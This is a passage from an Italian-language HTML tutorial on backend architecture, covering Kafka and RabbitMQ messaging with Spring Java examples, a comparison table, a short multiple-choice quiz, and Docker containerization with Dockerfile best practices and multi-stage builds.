│                                │                         │                  │
│                                │  Broker 1   Broker 2    │    ┌──────────┐ │
│                                │  ┌──────┐   ┌──────┐    │───►│Consumer  │ │
│                                │  │P0,P2 │   │P1    │    │    │Group B   │ │
│                                │  │leader│   │leader│    │    │(all P)   │ │
│                                │  └──────┘   └──────┘    │    └──────────┘ │
│                                │                         │                  │
│                                │  Replication Factor = 2 │                  │
│                                └─────────────────────────┘                  │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   Key Concepts:                                                             │
│   • Topic: categoria/feed di messaggi (come una tabella)                    │
│   • Partition: unità di parallelismo, messaggi ordinati per partition       │
│   • Offset: ID sequenziale del messaggio nella partition                    │
│   • Consumer Group: gruppo di consumer che si dividono le partition         │
│   • Replication: copie delle partition su broker diversi (fault tolerance)  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Kafka Producer</h3>

                <pre><code class="language-java">// Configurazione Spring Kafka Producer
@Configuration
public class KafkaProducerConfig {

    @Bean
    public ProducerFactory&lt;String, OrderEvent&gt; producerFactory() {
        Map&lt;String, Object&gt; config = new HashMap&lt;&gt;();
        config.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "localhost:9092");
        config.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class);
        config.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, JsonSerializer.class);

        // Durability settings
        config.put(ProducerConfig.ACKS_CONFIG, "all");  // Aspetta ACK da tutti i replica
        config.put(ProducerConfig.RETRIES_CONFIG, 3);
        config.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, true);  // Exactly-once

        return new DefaultKafkaProducerFactory&lt;&gt;(config);
    }

    @Bean
    public KafkaTemplate&lt;String, OrderEvent&gt; kafkaTemplate() {
        return new KafkaTemplate&lt;&gt;(producerFactory());
    }
}

@Service
@RequiredArgsConstructor
public class OrderEventPublisher {

    private final KafkaTemplate&lt;String, OrderEvent&gt; kafkaTemplate;

    public void publishOrderCreated(Order order) {
        OrderEvent event = new OrderEvent(
            order.getId(),
            OrderEventType.CREATED,
            order.getCustomerId(),
            order.getTotal(),
            Instant.now()
        );

        // Key = customerId per garantire ordine per cliente
        kafkaTemplate.send("orders", order.getCustomerId().toString(), event)
            .whenComplete((result, ex) -> {
                if (ex == null) {
                    log.info("Sent event to partition {} offset {}",
                        result.getRecordMetadata().partition(),
                        result.getRecordMetadata().offset());
                } else {
                    log.error("Failed to send event", ex);
                }
            });
    }
}</code></pre>

                <h3>Kafka Consumer</h3>

                <pre><code class="language-java">// Consumer configuration
@Configuration
@EnableKafka
public class KafkaConsumerConfig {

    @Bean
    public ConsumerFactory&lt;String, OrderEvent&gt; consumerFactory() {
        Map&lt;String, Object&gt; config = new HashMap&lt;&gt;();
        config.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, "localhost:9092");
        config.put(ConsumerConfig.GROUP_ID_CONFIG, "order-processor");
        config.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class);
        config.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class);

        // Offset management
        config.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, "earliest");
        config.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, false);  // Manual commit

        return new DefaultKafkaConsumerFactory&lt;&gt;(config);
    }

    @Bean
    public ConcurrentKafkaListenerContainerFactory&lt;String, OrderEvent&gt;
            kafkaListenerContainerFactory() {
        ConcurrentKafkaListenerContainerFactory&lt;String, OrderEvent&gt; factory =
            new ConcurrentKafkaListenerContainerFactory&lt;&gt;();
        factory.setConsumerFactory(consumerFactory());
        factory.setConcurrency(3);  // 3 consumer threads
        factory.getContainerProperties().setAckMode(AckMode.MANUAL_IMMEDIATE);
        return factory;
    }
}

@Service
@Slf4j
public class OrderEventConsumer {

    @KafkaListener(
        topics = "orders",
        groupId = "order-processor",
        containerFactory = "kafkaListenerContainerFactory"
    )
    public void consume(
            @Payload OrderEvent event,
            @Header(KafkaHeaders.RECEIVED_PARTITION) int partition,
            @Header(KafkaHeaders.OFFSET) long offset,
            Acknowledgment ack) {

        try {
            log.info("Received event: {} from partition {} offset {}",
                event.getType(), partition, offset);

            processEvent(event);

            // Manual acknowledgment dopo processing riuscito
            ack.acknowledge();

        } catch (Exception e) {
            log.error("Error processing event, will retry", e);
            // Non fare ack - il messaggio verrà ri-processato
            // Oppure invia a Dead Letter Topic
        }
    }

    // Batch consumer per high throughput
    @KafkaListener(topics = "events", groupId = "batch-processor", batch = "true")
    public void consumeBatch(List&lt;ConsumerRecord&lt;String, Event&gt;&gt; records, Acknowledgment ack) {
        log.info("Received batch of {} records", records.size());

        records.forEach(record -> processEvent(record.value()));

        ack.acknowledge();  // Commit dell'intero batch
    }
}</code></pre>

                <h3>Exactly-Once Semantics</h3>

                <div class="info-box">
                    <h4>Delivery Guarantees</h4>
                    <ul>
                        <li><strong>At-most-once:</strong> Messaggi possono essere persi, mai duplicati (fire-and-forget)</li>
                        <li><strong>At-least-once:</strong> Messaggi mai persi, possibili duplicati (default Kafka)</li>
                        <li><strong>Exactly-once:</strong> Ogni messaggio processato esattamente una volta (richiede configurazione specifica)</li>
                    </ul>
                </div>

                <pre><code class="language-java">// Exactly-once con Transactional Producer + Consumer
@Configuration
public class ExactlyOnceConfig {

    @Bean
    public ProducerFactory&lt;String, Event&gt; transactionalProducerFactory() {
        Map&lt;String, Object&gt; config = new HashMap&lt;&gt;();
        config.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "localhost:9092");
        config.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, true);
        config.put(ProducerConfig.TRANSACTIONAL_ID_CONFIG, "tx-producer-1");
        // ...serializers

        DefaultKafkaProducerFactory&lt;String, Event&gt; factory =
            new DefaultKafkaProducerFactory&lt;&gt;(config);
        factory.setTransactionIdPrefix("tx-");
        return factory;
    }

    @Bean
    public KafkaTransactionManager&lt;String, Event&gt; kafkaTransactionManager() {
        return new KafkaTransactionManager&lt;&gt;(transactionalProducerFactory());
    }
}

@Service
public class TransactionalProcessor {

    private final KafkaTemplate&lt;String, Event&gt; kafkaTemplate;

    @Transactional("kafkaTransactionManager")
    public void processAndPublish(Event input) {
        // Read-Process-Write in una transazione Kafka
        Event processed = process(input);
        kafkaTemplate.send("output-topic", processed);
        // Se fallisce, tutto viene rollbackato
    }
}</code></pre>

                <h3>Partitioning Strategy</h3>

                <pre><code class="language-java">// Custom partitioner per controllo distribuzione
public class CustomerPartitioner implements Partitioner {

    @Override
    public int partition(String topic, Object key, byte[] keyBytes,
                         Object value, byte[] valueBytes, Cluster cluster) {
        List&lt;PartitionInfo&gt; partitions = cluster.partitionsForTopic(topic);
        int numPartitions = partitions.size();

        if (key == null) {
            // Round-robin per messaggi senza key
            return ThreadLocalRandom.current().nextInt(numPartitions);
        }

        // Consistent hashing sul customer ID
        // Tutti gli ordini dello stesso cliente vanno alla stessa partition
        // → Garantisce ordine per cliente
        return Math.abs(key.hashCode()) % numPartitions;
    }

    @Override
    public void close() {}

    @Override
    public void configure(Map&lt;String, ?&gt; configs) {}
}</code></pre>
            </section>

            <!-- RabbitMQ Section -->
            <section class="section" id="modulo4-rabbitmq">
                <h2>RabbitMQ - Message Broker</h2>

                <p><strong>RabbitMQ</strong> è un message broker che implementa il protocollo AMQP (Advanced Message Queuing Protocol). È progettato per scenari di messaging tradizionale con routing flessibile e garanzie di delivery.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        RABBITMQ ARCHITECTURE                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Producer                    RabbitMQ Broker                   Consumer    │
│   ────────                    ───────────────                   ────────    │
│                                                                             │
│   ┌─────────┐     ┌─────────────────────────────────────────┐              │
│   │Publisher│────►│  Exchange                               │              │
│   └─────────┘     │  ┌─────────────────────────────────┐    │              │
│                   │  │  Routing Logic                   │    │              │
│                   │  │  (type: direct/fanout/topic/    │    │              │
│                   │  │   headers)                       │    │              │
│                   │  └───────────┬─────────────────────┘    │              │
│                   │              │                           │              │
│                   │              │ Bindings                  │              │
│                   │              │ (routing rules)           │              │
│                   │              │                           │              │
│                   │  ┌───────────▼───────────────────────┐  │  ┌─────────┐│
│                   │  │  Queue: order.created              │──┼─►│Consumer ││
│                   │  │  [msg1][msg2][msg3]               │  │  │   A     ││
│                   │  └───────────────────────────────────┘  │  └─────────┘│
│                   │                                         │              │
│                   │  ┌───────────────────────────────────┐  │  ┌─────────┐│
│                   │  │  Queue: order.shipped              │──┼─►│Consumer ││
│                   │  │  [msg4][msg5]                     │  │  │   B     ││
│                   │  └───────────────────────────────────┘  │  └─────────┘│
│                   │                                         │              │
│                   └─────────────────────────────────────────┘              │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   Exchange Types:                                                           │
│   • Direct:  routing key esatto (1:1)                                       │
│   • Fanout:  broadcast a tutte le queue (1:N)                               │
│   • Topic:   pattern matching con wildcard (*.orders.#)                     │
│   • Headers: routing basato su header attributes                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Exchange Types in dettaglio</h3>

                <pre><code class="language-java">@Configuration
public class RabbitMQConfig {

    // ═══════════════════════════════════════════════════════════════════════
    // DIRECT EXCHANGE - Routing esatto per key
    // ═══════════════════════════════════════════════════════════════════════

    @Bean
    public DirectExchange orderExchange() {
        return new DirectExchange("order.exchange");
    }

    @Bean
    public Queue orderCreatedQueue() {
        return QueueBuilder.durable("order.created")
            .withArgument("x-dead-letter-exchange", "dlx.exchange")
            .withArgument("x-dead-letter-routing-key", "order.created.dlq")
            .build();
    }

    @Bean
    public Binding orderCreatedBinding() {
        return BindingBuilder
            .bind(orderCreatedQueue())
            .to(orderExchange())
            .with("order.created");  // Routing key esatto
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FANOUT EXCHANGE - Broadcast a tutte le queue
    // ═══════════════════════════════════════════════════════════════════════

    @Bean
    public FanoutExchange notificationExchange() {
        return new FanoutExchange("notification.fanout");
    }

    @Bean
    public Queue emailQueue() {
        return new Queue("notification.email");
    }

    @Bean
    public Queue smsQueue() {
        return new Queue("notification.sms");
    }

    @Bean
    public Queue pushQueue() {
        return new Queue("notification.push");
    }

    @Bean
    public Binding emailBinding() {
        return BindingBuilder.bind(emailQueue()).to(notificationExchange());
        // Nessun routing key - riceve TUTTO
    }

    // ═══════════════════════════════════════════════════════════════════════
    // TOPIC EXCHANGE - Pattern matching
    // ═══════════════════════════════════════════════════════════════════════

    @Bean
    public TopicExchange eventExchange() {
        return new TopicExchange("event.topic");
    }

    @Bean
    public Queue allOrderEventsQueue() {
        return new Queue("events.orders.all");
    }

    @Bean
    public Queue europeanEventsQueue() {
        return new Queue("events.europe");
    }

    @Bean
    public Binding allOrdersBinding() {
        return BindingBuilder
            .bind(allOrderEventsQueue())
            .to(eventExchange())
            .with("order.*");  // order.created, order.shipped, order.cancelled
    }

    @Bean
    public Binding europeanBinding() {
        return BindingBuilder
            .bind(europeanEventsQueue())
            .to(eventExchange())
            .with("*.*.europe.#");  // user.created.europe, order.shipped.europe.italy
    }
    // Pattern: * = una parola, # = zero o più parole
}</code></pre>

                <h3>Producer e Consumer</h3>

                <pre><code class="language-java">// Producer
@Service
@RequiredArgsConstructor
public class OrderEventPublisher {

    private final RabbitTemplate rabbitTemplate;

    public void publishOrderCreated(Order order) {
        OrderEvent event = new OrderEvent(order.getId(), "CREATED", Instant.now());

        rabbitTemplate.convertAndSend(
            "order.exchange",      // Exchange
            "order.created",       // Routing key
            event,
            message -> {
                // Headers per tracing
                message.getMessageProperties().setCorrelationId(UUID.randomUUID().toString());
                message.getMessageProperties().setContentType("application/json");
                return message;
            }
        );
    }

    // Con conferma di pubblicazione
    public void publishWithConfirmation(OrderEvent event) {
        CorrelationData correlationData = new CorrelationData(UUID.randomUUID().toString());

        rabbitTemplate.convertAndSend("order.exchange", "order.created", event, correlationData);

        correlationData.getFuture().whenComplete((confirm, ex) -> {
            if (confirm != null && confirm.isAck()) {
                log.info("Message confirmed by broker");
            } else {
                log.error("Message not confirmed: {}", confirm != null ? confirm.getReason() : ex);
                // Retry o salva per riprocessamento
            }
        });
    }
}

// Consumer
@Service
@Slf4j
public class OrderEventConsumer {

    @RabbitListener(queues = "order.created")
    public void handleOrderCreated(
            OrderEvent event,
            @Header(AmqpHeaders.DELIVERY_TAG) long deliveryTag,
            Channel channel) throws IOException {

        try {
            log.info("Processing order event: {}", event.getOrderId());

            processOrder(event);

            // Manual ACK
            channel.basicAck(deliveryTag, false);

        } catch (RecoverableException e) {
            // Requeue per retry
            channel.basicNack(deliveryTag, false, true);

        } catch (Exception e) {
            // Non recuperabile - invia a DLQ (reject senza requeue)
            channel.basicNack(deliveryTag, false, false);
        }
    }

    // Con retry automatico
    @RabbitListener(queues = "order.created", containerFactory = "retryContainerFactory")
    public void handleWithRetry(OrderEvent event) {
        processOrder(event);  // Eccezioni causano retry automatico
    }
}

// Retry configuration
@Bean
public SimpleRabbitListenerContainerFactory retryContainerFactory(
        ConnectionFactory connectionFactory) {
    SimpleRabbitListenerContainerFactory factory = new SimpleRabbitListenerContainerFactory();
    factory.setConnectionFactory(connectionFactory);
    factory.setAcknowledgeMode(AcknowledgeMode.AUTO);

    factory.setAdviceChain(RetryInterceptorBuilder.stateless()
        .maxAttempts(3)
        .backOffOptions(1000, 2.0, 10000)  // 1s, 2s, 4s, max 10s
        .recoverer(new RejectAndDontRequeueRecoverer())  // Dopo 3 tentativi → DLQ
        .build());

    return factory;
}</code></pre>

                <div class="info-box warning">
                    <h4>Dead Letter Queue (DLQ)</h4>
                    <p>I messaggi finiscono in DLQ quando: (1) vengono rejected senza requeue, (2) TTL scade, (3) queue overflow. Configura sempre DLQ per non perdere messaggi problematici e poterli analizzare/riprocessare.</p>
                </div>
            </section>

            <!-- Kafka vs RabbitMQ Section -->
            <section class="section" id="modulo4-comparison">
                <h2>Kafka vs RabbitMQ</h2>

                <p>Kafka e RabbitMQ risolvono problemi diversi. Capire le differenze è fondamentale per scegliere lo strumento giusto.</p>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>Apache Kafka</th>
                            <th>RabbitMQ</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Modello</strong></td>
                            <td>Event streaming / Log distribuito</td>
                            <td>Message broker tradizionale</td>
                        </tr>
                        <tr>
                            <td><strong>Persistenza</strong></td>
                            <td>Messaggi persistiti per retention period (giorni/settimane)</td>
                            <td>Messaggi rimossi dopo ACK</td>
                        </tr>
                        <tr>
                            <td><strong>Replay</strong></td>
                            <td>Sì - consumer può rileggere da qualsiasi offset</td>
                            <td>No - messaggio consumato è perso</td>
                        </tr>
                        <tr>
                            <td><strong>Throughput</strong></td>
                            <td>Molto alto (milioni msg/sec)</td>
                            <td>Alto (decine di migliaia msg/sec)</td>
                        </tr>
                        <tr>
                            <td><strong>Latenza</strong></td>
                            <td>Più alta (batching)</td>
                            <td>Più bassa (singoli messaggi)</td>
                        </tr>
                        <tr>
                            <td><strong>Routing</strong></td>
                            <td>Semplice (topic/partition)</td>
                            <td>Complesso (exchange types, binding keys)</td>
                        </tr>
                        <tr>
                            <td><strong>Ordine messaggi</strong></td>
                            <td>Garantito per partition</td>
                            <td>Garantito per queue (single consumer)</td>
                        </tr>
                        <tr>
                            <td><strong>Consumer groups</strong></td>
                            <td>Built-in, scalabile</td>
                            <td>Competing consumers (più limitato)</td>
                        </tr>
                        <tr>
                            <td><strong>Protocollo</strong></td>
                            <td>Proprietario (TCP binary)</td>
                            <td>AMQP (standard), MQTT, STOMP</td>
                        </tr>
                    </tbody>
                </table>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                      WHEN TO USE WHAT                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   USE KAFKA WHEN:                      USE RABBITMQ WHEN:                   │
│   ───────────────                      ─────────────────                    │
│                                                                             │
│   ✓ Event sourcing                     ✓ Task queues / job distribution    │
│   ✓ Log aggregation                    ✓ Complex routing requirements       │
│   ✓ Stream processing                  ✓ Request/reply pattern              │
│   ✓ Replay di eventi necessario        ✓ Messaggi transitori                │
│   ✓ Alto throughput (>100k msg/sec)    ✓ Bassa latenza critica              │
│   ✓ Multiple consumer groups           ✓ Priorità messaggi                  │
│   ✓ Data pipeline / ETL                ✓ Integrazione legacy (AMQP)         │
│   ✓ Audit trail / compliance           ✓ RPC asincrono                      │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   EXAMPLE USE CASES:                                                        │
│                                                                             │
│   KAFKA:                               RABBITMQ:                            │
│   • Real-time analytics                • Email sending queue                │
│   • User activity tracking             • Order processing                   │
│   • CDC (Change Data Capture)          • Notification distribution          │
│   • Metrics collection                 • Background job processing          │
│   • Event-driven microservices         • API rate limiting                  │
│   • Machine learning pipelines         • IoT command distribution           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Coesistenza in architetture reali</h3>

                <pre><code class="language-java">// Molte architetture usano ENTRAMBI per scopi diversi

@Service
public class OrderService {

    private final KafkaTemplate&lt;String, OrderEvent&gt; kafkaTemplate;
    private final RabbitTemplate rabbitTemplate;

    @Transactional
    public Order createOrder(OrderRequest request) {
        Order order = orderRepository.save(buildOrder(request));

        // KAFKA: Event sourcing - traccia TUTTO ciò che succede
        // I consumer possono rileggere, fare analytics, audit
        kafkaTemplate.send("order-events", order.getId().toString(),
            new OrderEvent(order, OrderEventType.CREATED));

        // RABBITMQ: Task queue - invia email di conferma
        // Non serve persistenza, serve routing a worker specifici
        rabbitTemplate.convertAndSend("notifications", "email.order.confirmation",
            new EmailNotification(order.getCustomerEmail(), "Order confirmed"));

        return order;
    }
}

// Kafka consumer per analytics (può rileggere lo storico)
@KafkaListener(topics = "order-events", groupId = "analytics")
public void trackForAnalytics(OrderEvent event) {
    analyticsService.track(event);
}

// Kafka consumer per search indexing (consumer group diverso)
@KafkaListener(topics = "order-events", groupId = "search-indexer")
public void indexForSearch(OrderEvent event) {
    elasticsearchService.index(event);
}

// RabbitMQ consumer per email (task queue, rimuove dopo processing)
@RabbitListener(queues = "email.order.confirmation")
public void sendConfirmationEmail(EmailNotification notification) {
    emailService.send(notification);
}</code></pre>

                <div class="info-box success">
                    <h4>Regola pratica</h4>
                    <p><strong>Kafka</strong>: "Cosa è successo?" (event log, audit, analytics, replay)<br>
                    <strong>RabbitMQ</strong>: "Cosa devo fare?" (task distribution, commands, notifications)</p>
                </div>
            </section>

            <!-- Quiz Section Module 4 -->
            <section class="quiz-section" id="modulo4-quiz">
                <h2>Interactive Challenge Quiz - Database & Messaging</h2>
                <p style="color: var(--text-secondary); margin-bottom: 30px;">Verifica la tua comprensione di database e sistemi di messaging.</p>

                <!-- Question 16 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q1.</span> In Kafka, se hai un topic con 6 partizioni e un consumer group con 8 consumer, cosa succede?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q16" id="q16a" value="a">
                            <label for="q16a">Kafka crea automaticamente 2 partizioni aggiuntive</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q16" id="q16b" value="b">
                            <label for="q16b">2 consumer resteranno idle senza partizioni assegnate</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q16" id="q16c" value="c">
                            <label for="q16c">I messaggi vengono distribuiti round-robin tra tutti gli 8 consumer</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q16" id="q16d" value="d">
                            <label for="q16d">Kafka lancia un'eccezione e rifiuta i consumer in eccesso</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q16')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q16"></div>
                </div>

                <!-- Question 17 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q2.</span> Quale tipo di Exchange RabbitMQ useresti per implementare un sistema di notifiche dove ogni evento deve essere ricevuto da TUTTI i subscriber (email, SMS, push)?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q17" id="q17a" value="a">
                            <label for="q17a">Direct Exchange con lo stesso routing key per tutte le queue</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q17" id="q17b" value="b">
                            <label for="q17b">Topic Exchange con pattern # per tutte le queue</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q17" id="q17c" value="c">
                            <label for="q17c">Headers Exchange con match policy "any"</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q17" id="q17d" value="d">
                            <label for="q17d">Fanout Exchange</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q17')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q17"></div>
                </div>

                <!-- Question 18 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q3.</span> Un sistema necessita di: (1) rileggere eventi passati per debug, (2) multiple applicazioni che processano gli stessi eventi indipendentemente, (3) ordine garantito per chiave. Quale soluzione è più adatta?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q18" id="q18a" value="a">
                            <label for="q18a">RabbitMQ con Durable Queues e message TTL lungo</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q18" id="q18b" value="b">
                            <label for="q18b">RabbitMQ con Topic Exchange e multiple queue</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q18" id="q18c" value="c">
                            <label for="q18c">Kafka con consumer groups separati e partitioning per key</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q18" id="q18d" value="d">
                            <label for="q18d">Redis Pub/Sub con persistenza attiva</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q18')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q18"></div>
                </div>

                <!-- Question 19 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q4.</span> In un sistema e-commerce, quale database type è più adatto per il CATALOGO PRODOTTI con attributi variabili (laptop ha CPU/RAM, vestiti hanno taglia/colore)?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q19" id="q19a" value="a">
                            <label for="q19a">Document DB (MongoDB) per schema flessibile</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q19" id="q19b" value="b">
                            <label for="q19b">SQL con Entity-Attribute-Value (EAV) pattern</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q19" id="q19c" value="c">
                            <label for="q19c">Graph DB per le relazioni tra prodotti</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q19" id="q19d" value="d">
                            <label for="q19d">Key-Value store (Redis) per performance</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q19')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q19"></div>
                </div>

                <!-- Question 20 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q5.</span> Qual è la principale differenza tra <code>acks=1</code> e <code>acks=all</code> nella configurazione di un Kafka Producer?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q20" id="q20a" value="a">
                            <label for="q20a"><code>acks=all</code> invia il messaggio a tutti i consumer, <code>acks=1</code> solo a uno</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q20" id="q20b" value="b">
                            <label for="q20b"><code>acks=1</code> attende conferma solo dal leader, <code>acks=all</code> attende che tutti i replica abbiano scritto</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q20" id="q20c" value="c">
                            <label for="q20c"><code>acks=all</code> abilita la compressione, <code>acks=1</code> la disabilita</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q20" id="q20d" value="d">
                            <label for="q20d"><code>acks=1</code> è per messaggi transazionali, <code>acks=all</code> per messaggi normali</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q20')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q20"></div>
                </div>
            </section>

            <!-- ============================================== -->
            <!-- MODULO 5: CLOUD & DEVOPS -->
            <!-- ============================================== -->

            <header class="module-header" id="modulo5">
                <span class="module-tag">Modulo 5</span>
                <h1>Cloud & DevOps</h1>
                <p>Containerization, orchestration e strategie di deployment per applicazioni moderne</p>
            </header>

            <!-- Docker Section -->
            <section class="section" id="modulo5-docker">
                <h2>Docker & Containerization</h2>

                <p><strong>Docker</strong> ha rivoluzionato il modo in cui sviluppiamo, testiamo e deployamo applicazioni. Un <em>container</em> è un'unità standardizzata di software che impacchetta il codice insieme a tutte le sue dipendenze, garantendo che l'applicazione funzioni in modo identico indipendentemente dall'ambiente di esecuzione.</p>

                <h3>Container vs Virtual Machine</h3>

                <p>La differenza fondamentale sta nel livello di virtualizzazione:</p>

                <div class="diagram">
<pre>
   VIRTUAL MACHINES                    CONTAINERS
┌─────────────────────┐          ┌─────────────────────┐
│   App A  │   App B  │          │   App A  │   App B  │
├──────────┼──────────┤          ├──────────┼──────────┤
│  Libs A  │  Libs B  │          │  Libs A  │  Libs B  │
├──────────┼──────────┤          ├──────────┴──────────┤
│ Guest OS │ Guest OS │          │   Container Engine  │
├──────────┴──────────┤          │      (Docker)       │
│     Hypervisor      │          ├─────────────────────┤
├─────────────────────┤          │      Host OS        │
│      Host OS        │          ├─────────────────────┤
├─────────────────────┤          │     Hardware        │
│     Hardware        │          └─────────────────────┘
└─────────────────────┘
</pre>
                </div>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>Virtual Machine</th>
                            <th>Container</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Isolamento</td>
                            <td>Completo (hardware virtualization)</td>
                            <td>A livello di processo (kernel sharing)</td>
                        </tr>
                        <tr>
                            <td>Boot time</td>
                            <td>Minuti</td>
                            <td>Millisecondi/secondi</td>
                        </tr>
                        <tr>
                            <td>Dimensione</td>
                            <td>GB (include intero OS)</td>
                            <td>MB (solo app + dipendenze)</td>
                        </tr>
                        <tr>
                            <td>Overhead</td>
                            <td>Alto (hypervisor + guest OS)</td>
                            <td>Minimo (condivide kernel host)</td>
                        </tr>
                        <tr>
                            <td>Portabilità</td>
                            <td>Limitata al tipo di hypervisor</td>
                            <td>Eccellente (OCI standard)</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Dockerfile Best Practices</h3>

                <p>Un <strong>Dockerfile</strong> è un file di testo che contiene tutte le istruzioni per costruire un'immagine Docker. Scrivere Dockerfile efficienti è cruciale per build veloci e immagini sicure.</p>

                <pre><code class="language-dockerfile"># ❌ BAD: Non ottimizzato
FROM ubuntu:latest
RUN apt-get update
RUN apt-get install -y python3
RUN apt-get install -y python3-pip
COPY . /app
RUN pip install -r /app/requirements.txt
CMD ["python3", "/app/main.py"]

# ✅ GOOD: Ottimizzato
FROM python:3.11-slim AS base

# Non eseguire come root
RUN useradd --create-home appuser

WORKDIR /app

# Copia prima i file di dipendenze (cache layer)
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Poi copia il codice sorgente
COPY --chown=appuser:appuser . .

USER appuser

CMD ["python", "main.py"]</code></pre>

                <div class="info-box">
                    <h4>Principi chiave per Dockerfile efficienti</h4>
                    <ul>
                        <li><strong>Layer ordering</strong>: metti le istruzioni che cambiano meno frequentemente in alto (dipendenze prima del codice)</li>
                        <li><strong>Minimize layers</strong>: combina RUN commands con <code>&&</code> quando possibile</li>
                        <li><strong>Use specific tags</strong>: evita <code>:latest</code>, usa versioni esplicite come <code>:3.11-slim</code></li>
                        <li><strong>Non-root user</strong>: esegui sempre l'applicazione come utente non privilegiato</li>
                        <li><strong>.dockerignore</strong>: escludi file non necessari (node_modules, .git, __pycache__)</li>
                    </ul>
                </div>

                <h3>Multi-stage Builds</h3>

                <p>I <strong>multi-stage builds</strong> permettono di separare l'ambiente di build da quello di runtime, producendo immagini finali molto più piccole e sicure.</p>

                <pre><code class="language-dockerfile"># Stage 1: Build
FROM maven:3.9-eclipse-temurin-21 AS builder
WORKDIR /build
COPY pom.xml .
# Download dipendenze separatamente per sfruttare la cache
RUN mvn dependency:go-offline
COPY src ./src
RUN mvn package -DskipTests

# Stage 2: Runtime
FROM eclipse-temurin:21-jre-alpine
WORKDIR /app

# Crea utente non-root
RUN addgroup -S spring && adduser -S spring -G spring

# Copia SOLO il JAR dal builder stage
COPY --from=builder /build/target/*.jar app.jar

# Imposta utente non-root
USER spring:spring

# Health check
HEALTHCHECK --interval=30s --timeout=3s \
  CMD wget -q --spider http://localhost:8080/actuator/health || exit 1

EXPOSE 8080
ENTRYPOINT ["java", "-jar", "app.jar"]</code></pre>

                <p>Con questo approccio, l'immagine finale contiene <strong>solo</strong> il JRE e il JAR compilato, non Maven, il codice sorgente o le dipendenze di build. Il risultato è un'immagine che passa da ~500MB a ~150MB.</p>

                <h3>Layer Caching</h3>

                <p>Docker costruisce le immagini layer by layer. Ogni istruzione nel Dockerfile crea un nuovo layer, e Docker può riutilizzare i layer dalla cache se il contenuto non è cambiato.</p>

                <div class="diagram">
<pre>
         DOCKER BUILD CACHE MECHANISM

Dockerfile Instruction      Layer Cache Status
─────────────────────────────────────────────────
